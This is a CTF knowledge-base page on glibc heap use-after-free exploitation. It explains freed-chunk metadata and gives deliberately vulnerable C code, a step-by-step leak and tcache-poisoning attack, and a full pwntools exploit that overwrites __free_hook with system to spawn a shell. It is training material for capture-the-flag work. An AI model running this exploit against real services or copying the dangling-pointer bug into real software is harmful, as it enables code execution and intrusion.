---
title: "Use-After-Free - Leaking and Hijacking Through a Dangling Pointer"
category: pwn
subcategory: heap
type: technique
tags: [uaf, use-after-free, dangling-pointer, heap, tcache, fastbin, unsorted-bin, libc-leak, heap-leak, free-hook, double-free, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: easy
summary: "free() without NULLing the pointer leaves you reading and writing allocator metadata - the cheapest libc leak and the front door to tcache poisoning."
when_to_use:
  - "The menu's free option does not zero the global pointer array"
  - "show()/edit() still work on an index after you freed it"
  - "A struct holds a callback pointer and the object can be freed while still referenced"
  - "You need a libc or heap leak and the binary has no format string or OOB read"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-internals-primer, heap-tcache-poisoning, heap-double-free, heap-unsorted-bin-leak, heap-write-targets]
---

## TL;DR

`free(p)` does not clear `p`. If the program keeps using index `i` after freeing it, you
get to *read* the allocator's linked-list pointers (heap leak from tcache/fastbin, libc
leak from unsorted/smallbin) and to *write* them (tcache poisoning -> arbitrary
allocation). UAF is the single most common heap bug in CTF because it is one missing
`ptr[i] = NULL;`.

## Recognise it

- `do_free()` calls `free(ptr[i])` and returns without `ptr[i] = NULL`.
- The menu offers `show` and `edit` that take an index with no "is it live" flag.
- A C++ challenge with `delete obj;` and a later `obj->method()` (vtable UAF).
- `ptr[i]` is only invalidated on a *successful* free, and the free path has an early
  `return` on some condition.
- Decompiler hint: the free branch has no store to the global array afterwards.

## Vulnerable code shape

```c
static char *ptr[16];
static unsigned sz[16];

void do_free(void) {
    unsigned i = read_idx();
    if (i >= 16) return;
    free(ptr[i]);            /* BUG: ptr[i] left dangling, sz[i] left set */
}

void do_show(void) {
    unsigned i = read_idx();
    if (i >= 16 || !ptr[i]) return;
    write(1, ptr[i], sz[i]); /* reads freed metadata: fd, bk, key */
}

void do_edit(void) {
    unsigned i = read_idx();
    if (i >= 16 || !ptr[i]) return;
    read(0, ptr[i], sz[i]);  /* writes freed metadata: overwrite fd */
}
```

The C++ flavour:

```c
struct Note { void (*print)(struct Note *); char body[0x20]; };

void do_delete(struct Note **slot) {
    free(*slot);             /* *slot not NULLed */
}

void do_print(struct Note *n) {
    n->print(n);             /* indirect call through freed memory */
}
```

## Theory

Targets: glibc 2.23 through 2.39. What changes across versions is only *what* you find
in the freed chunk, not whether the bug works.

A freed chunk's first 0x10 user bytes are metadata:

| bin | bytes 0x00-0x07 | bytes 0x08-0x0f |
|-----|-----------------|-----------------|
| tcache (2.26-2.31) | `next` = raw heap ptr of the next entry, or 0 | `key` = `&tcache` (2.29-2.33) |
| tcache (2.32+) | `next` = `PROTECT_PTR(&chunk->next, nextptr)` | `key` = random `tcache_key` (2.34+) |
| fastbin | `fd` = next fastbin entry (mangled from 2.32) | untouched user data |
| unsorted | `fd` = `&main_arena.bins[0]` (= `main_arena+0x60`) | `bk` = same |
| smallbin | `fd`/`bk` = neighbours or `&main_arena.bins[2*idx]` | |
| largebin | `fd`/`bk` | plus `fd_nextsize`/`bk_nextsize` at 0x10/0x18 |

So:

- **Heap leak**: free two chunks of the same tcache size, `show()` the second one -
  its `next` points at the first. On 2.32+ that value is `(heap>>12) ^ ptr`, which is
  *still* a heap leak (see `heap-safe-linking-bypass`).
- **Libc leak**: free one chunk of size >= 0x420 (skips tcache) with a live guard chunk
  behind it so it cannot merge into top, then `show()` it. `fd` = `main_arena+0x60`.
- **Arbitrary allocation**: `edit()` a chunk that is sitting in tcache and overwrite
  `next` with `target`. The next two mallocs of that size return the real chunk and
  then `target`.

The only thing a UAF cannot do by itself is bypass safe-linking without a heap leak -
but the heap leak is step one anyway.

## Attack

Assume glibc 2.31 (no safe-linking), a menu with `alloc/free/show/edit`, and an index
that is never invalidated.

1. `alloc(0, 0x418)` - a chunk too big for tcache.
2. `alloc(1, 0x18)` - guard, so chunk 0 cannot consolidate into top.
3. `free(0)` - chunk 0 lands in the unsorted bin.
4. `show(0)` - read 8 bytes = `main_arena + 0x60`. Compute
   `libc.address = leak - (libc.sym['main_arena'] + 0x60)`, or in practice
   `leak - 0x1ecbe0` for a specific 2.31 build. Prefer deriving the offset from the
   provided libc rather than hardcoding.
5. `alloc(2, 0x88)`, `alloc(3, 0x88)` - two same-size tcache candidates.
6. `free(2)`, `free(3)` - tcache[0x90] = 3 -> 2.
7. `show(3)` - read `next` = address of chunk 2. Heap leak. `heap_base = leak - 0x2a0 - ...`
   (subtract the known offset of chunk 2 from the heap base).
8. `edit(3, p64(libc.sym['__free_hook']))` - poison the tcache fd.
9. `alloc(4, 0x88)` - returns chunk 3 (the real one).
10. `alloc(5, 0x88)` - returns `__free_hook`.
11. `edit(5, p64(system_addr))` - `__free_hook = system`.
12. `alloc(6, 0x18, b"/bin/sh\x00")`, `free(6)` - `system("/bin/sh")`.

## Heap state

```text
step 3-4  (unsorted bin libc leak)

  chunk0  +0x000 | prev_size                 |
          +0x008 | size = 0x421 (P)          |
          +0x010 | fd = main_arena+0x60      |  <-- show(0) reads THIS
          +0x018 | bk = main_arena+0x60      |
  chunk1  +0x420 | size = 0x21 (P)           |  guard, keeps chunk0 off top
          +0x430 | top ...                   |

step 6    (two chunks in tcache[0x90])

  tcache->entries[7] --> chunk3
  chunk3  +0x010 | next = chunk2             |  <-- show(3) reads THIS (heap leak)
          +0x018 | key  = &tcache            |
  chunk2  +0x010 | next = 0                  |
          +0x018 | key  = &tcache            |

step 8    (poisoned)

  tcache->entries[7] --> chunk3
  chunk3  +0x010 | next = __free_hook        |  <-- edit(3) wrote THIS
  malloc#1 -> chunk3 ;  entries[7] = __free_hook
  malloc#2 -> __free_hook   (count goes 1 -> 0, no validation pre-2.34)
```

## Exploit

```python
#!/usr/bin/env python3
"""Use-after-free -> unsorted libc leak -> tcache poison -> __free_hook = system.

Target: glibc 2.27 - 2.31 (tcache, no safe-linking, hooks still present).
Usage:
    ./exploit.py                       # local
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import (ELF, args, context, log, p64, process, remote, u64)

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    if args.GDB:
        from pwn import gdb
        return gdb.debug([BINARY], gdbscript="b *0\nc\n")
    return process([BINARY])


io = start()


def menu(choice):
    io.sendlineafter(b"> ", str(choice).encode())


def alloc(idx, size, data=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", data)


def free(idx):
    menu(2)
    io.sendlineafter(b"index: ", str(idx).encode())


def show(idx):
    menu(3)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(idx, data):
    menu(4)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendafter(b"content: ", data)


def leak_u64(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ---------------------------------------------------------------- libc leak
# 0x418 rounds to a 0x420 chunk: too big for tcache, straight to unsorted.
alloc(0, 0x418, b"victim")
alloc(1, 0x18, b"guard")          # stop chunk 0 merging into the top chunk
free(0)

arena = leak_u64(show(0))
log.success("main_arena+0x60 = %#x", arena)
# unsorted fd points at &main_arena.bins[0], which is main_arena + 0x60.
libc.address = arena - 0x60 - libc.sym["main_arena"]
log.success("libc base       = %#x", libc.address)

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
log.info("__free_hook = %#x   system = %#x", free_hook, system)

# ---------------------------------------------------------------- heap leak
alloc(2, 0x88, b"A" * 8)
alloc(3, 0x88, b"B" * 8)
free(2)
free(3)                            # tcache[0x90]: 3 -> 2 -> NULL

chunk2 = leak_u64(show(3))
log.success("chunk2 address  = %#x", chunk2)
heap_base = chunk2 & ~0xFFF        # good enough for sanity printing
log.info("heap page       = %#x", heap_base)

# ------------------------------------------------------- tcache poisoning
edit(3, p64(free_hook))            # tcache[0x90]: 3 -> __free_hook
alloc(4, 0x88, b"pad")             # consumes chunk 3
alloc(5, 0x88, p64(system))        # returns __free_hook, writes system into it
log.success("__free_hook overwritten with system")

# ------------------------------------------------------------------- shell
alloc(6, 0x18, b"/bin/sh\x00")
free(6)                            # free("/bin/sh") -> system("/bin/sh")

io.interactive()
```

If `system` is not reachable (seccomp), swap step 11 for a `one_gadget`:

```python
#!/usr/bin/env python3
"""Pick a one_gadget instead of system when the hook fires with a clean rsp."""
import subprocess
import sys


def one_gadgets(libc_path):
    out = subprocess.run(["one_gadget", "--raw", libc_path],
                         capture_output=True, text=True, check=True)
    return [int(x, 0) for x in out.stdout.split()]


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "./libc.so.6"
    for off in one_gadgets(path):
        print("one_gadget offset: %#x" % off)
```

## Variants & pitfalls

- **`show()` uses `puts()`**, so a leak containing a `\x00` byte stops early. Unsorted
  `fd` values start with `0x7f` in the top byte and have no embedded nulls in the low
  6 bytes - fine. Heap pointers on 2.32+ *do* contain zero bytes; use `write()`-based
  shows or write filler first.
- **`sz[i]` is stale after free**, so `edit()` may let you write more than 0x10 bytes
  into a freed chunk - that is also a way to smash the *next* chunk's header.
- **calloc does not use tcache.** If the challenge allocates with `calloc`, poison the
  fastbin instead, or fill tcache so `_int_malloc` takes the fastbin path.
- **2.32+**: `next` is mangled. You must leak the heap first, then write
  `PROTECT_PTR(&chunk->next, target)` instead of `target`.
- **2.34+**: `__free_hook`/`__malloc_hook` are gone. Retarget to `_IO_2_1_stdout_`,
  `__exit_funcs`, or an FSOP chain - see `heap-write-targets` and `heap-fsop-file-struct`.
- **C++ vtable UAF**: after `delete`, reclaim the object with a same-size allocation
  whose first 8 bytes are your fake vtable pointer; the fake vtable can live in the
  same reclaimed buffer.
- **Double free is a *different* bug**: UAF gives you the write, double free gives you
  the duplicate. Many challenges have both; prefer UAF because it has no key check.

## Debugging

```text
pwndbg> vis_heap_chunks 12        # see the fd/key fields you are about to read
pwndbg> bins                      # confirm which bin your chunk landed in
pwndbg> tcache                    # counts[] and entries[] after the poison
pwndbg> p &__free_hook
pwndbg> watch *(long*)&__free_hook
pwndbg> try_free <chunk_addr>     # dry-run a free and print which check would fail
pwndbg> telescope <chunk_addr> 6
```

```bash
# Confirm the pointer really is dangling: break on free, note the arg, then check the global.
# gdb: b free ; c ; p $rdi ; finish ; x/4gx &ptr
gdb -q ./chal -ex 'b free' -ex 'run'
```

## Tools

- `pwntools` for the menu wrappers; `pwndbg`/`gef` for bin inspection.
- `one_gadget` to turn a hook write into `execve("/bin/sh")` with no argument control.
- `libc.rip` / `libc-database` to identify the remote libc from your leaked
  `main_arena+0x60` value when the challenge does not ship a libc.
- `seccomp-tools dump ./chal` - always check before you plan on `system`.

## References

- shellphish `how2heap`: `tcache_poisoning.c`, `unsorted_bin_attack.c`.
- CTF Wiki, "Use After Free" and "tcache attack" chapters.
- glibc `malloc/malloc.c`: `tcache_put`, `tcache_get`, `_int_free`.
